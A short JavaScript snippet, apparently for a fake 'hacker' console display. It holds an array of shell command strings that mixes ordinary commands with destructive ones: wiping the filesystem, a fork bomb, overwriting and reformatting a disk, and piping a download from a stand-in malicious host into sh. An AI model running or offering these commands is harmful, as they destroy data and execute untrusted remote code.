
var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]

// # Console

$(document).ready(function () {
  /*
  for (var i = 0; i < commands.length; i++) {
    $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[i]+"</p>");
  }
  */
});
